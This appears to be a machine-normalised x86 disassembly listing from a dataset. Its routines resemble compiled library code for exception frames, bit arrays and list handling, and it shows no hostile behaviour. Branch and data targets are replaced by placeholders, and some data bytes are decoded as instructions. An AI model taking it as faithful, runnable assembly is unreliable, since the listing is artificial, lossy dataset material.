push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_416044
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4161fc
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41682f
mov eax [ ebp - 0x4 ]
call sub_416898
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_41612c
sub_416848
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_416834
xor eax eax
push ebp
push sub_41688b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_416340
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416892
mov eax [ ebp - 0x4 ]
call sub_416898
retn
sub_4168a4
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4168f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_4168f8
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_4168d4
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_402744
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402fc4
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_402764
mov edx edi
mov eax ebp
call sub_4168ec
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028fc
sub_41699c
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_4168d4
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_4168f8
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_4169e0
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_416a58
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax esi
call sub_4198b4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_416a98
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416b4e
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4044c4
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403610
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404688
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403610
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c098
call sub_403e8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416b55
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_416b74
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_416c09
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403610
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_404688
mov eax ebx
mov si 0xffff
call sub_4038bc
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416c10
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax ebx
mov si 0xffff
call sub_4038bc
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_4038bc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_4047a4
sub_416c1b
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403914
mov eax ebx
mov si 0xffff
call sub_4038bc
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_4038bc
push eax
lea eax [ ebx + 0x4 ]
call sub_406194
mov ecx eax
mov edx r-xdata
pop eax
call sub_403774
sub_416c66
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_416cb8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403774
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_416ce0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax edi
call sub_406194
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
mov si 0xffff
call sub_4038bc
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax edi
call sub_406194
mov edx eax
mov eax esi
call sub_416ce0
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax edi
call sub_406194
push eax
push r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
sub_416d78
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_416dcd
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_406194
mov edx eax
mov eax edi
call sub_416ce0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416dd4
lea eax [ ebp - 0x4 ]
call sub_406194
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_416ddc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_416e14
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416a58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_416e44
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_416e80
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403610
mov edx esp
mov eax esi
call sub_404688
add esp 0x100
pop esi
pop ebx
retn
sub_416ea8
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_416f3d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_403610
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_404688
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_4038bc
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_416e68
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_409730
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416f44
lea eax [ ebp - 0x14 ]
call sub_40442c
retn
sub_416f60
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_417468
mov edx ebx
mov eax esi
call sub_417400
sub_416f90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_416e68
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_416294
mov dl 0x1
mov eax ebx
call sub_416e44
sub_416fc0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ esi + 0x8 ] eax
xor ecx ecx
mov edx esi
mov eax esi
call sub_416d78
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_41700c
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov [ esi + 0xc ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov cl 0x1
mov edx esi
mov eax esi
call sub_416d78
mov eax [ esi + 0x8 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416a58
test bl bl
jle r-xdata
mov eax esi
call sub_417110
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_417064
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_416a84
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_4170e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_417110
mov eax esi
call sub_4171e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc ebx
xor edi edi
mov edx edi
mov eax esi
call sub_4171ec
push eax
mov eax [ ebp - 0x4 ]
call sub_417058
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
dec ebx
jne r-xdata
sub_417110
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41716a
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_416288
call sub_4036c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_417184
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx esi
call sub_4161a0
cmp ebp [ eax + 0x8 ]
je r-xdata
sub_4171c4
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4171ec
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_417200
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4172ae
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_403610
lea edx [ ebp - 0x108 ]
mov eax edi
call sub_404688
mov eax ebx
mov si 0xffff
call sub_4038bc
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4172b5
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
mov eax ebx
mov si 0xffff
call sub_4038bc
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_4038bc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4172c8
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_4047a4
sub_4172c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
call sub_404480
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_4038bc
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403900
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403900
call sub_41252c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebx + 0x8 ]
shl eax 0x2
call sub_402744
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4173c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403900
mov edx [ ebp - 0xc ]
call sub_41274c
movsx edi [ ebx + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_402764
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp - 0x10 ]
call sub_4127d0
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov esi [ eax + ebx * 4 ]
mov eax [ esi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
lea edx [ esi + 0x1a ]
call sub_404688
sub_4173e4
push ebx
push esi
mov esi edx
call sub_417058
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax ebx
pop esi
pop ebx
retn
sub_417400
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_40384c
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_416044
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_417100
xor ecx ecx
mov edx esi
mov eax ebx
call sub_416d78
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_41612c
sub_417468
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_416288
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_416340
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_416090
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_416d78
mov eax ebx
call sub_417100
pop edi
pop esi
pop ebx
retn
sub_4174c4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4161a0
mov edx eax
mov cl 0x2
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4161a0
call sub_4036c0
pop edi
pop esi
pop ebx
retn
sub_417508
push ecx
mov [ esp ] edx
sub cl 0x1
jb r-xdata
mov edx esp
mov ecx [ eax ]
call [ ecx + 0xc ]
pop edx
retn
dec cl
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edx
retn
sub_41752c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_416fc0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_417574
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4180b4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416a58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_4175a4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_4175c8
push ebx
push esi
push edi
mov edi ecx
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x24 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_4175ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417693
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_417734
xor eax eax
push ebp
push sub_417676
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41767d
mov eax [ ebp - 0x4 ]
call sub_4177f0
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_4176a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416a84
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_417734
xor eax eax
push ebp
push sub_41771b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4177f0
retn
sub_41774c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_417804
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_4177a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_417f4c
mov eax [ ebp - 0x8 ]
push eax
push sub_4181fc
push ebp
call sub_41774c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417804
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417899
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4178a0
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404450
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_404828
jne r-xdata
sub_4178b0
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4178ac
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfdc
jmp sub_403e8c
sub_4178e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_417930
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_406660
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_4178b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417937
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_417940
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417a18
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_417734
xor eax eax
push ebp
push sub_4179f6
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4179fd
mov eax [ ebp - 0x4 ]
call sub_4177f0
retn
sub_417a34
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_417a79
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4048dc
call sub_4091e8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417a80
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_417a88
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
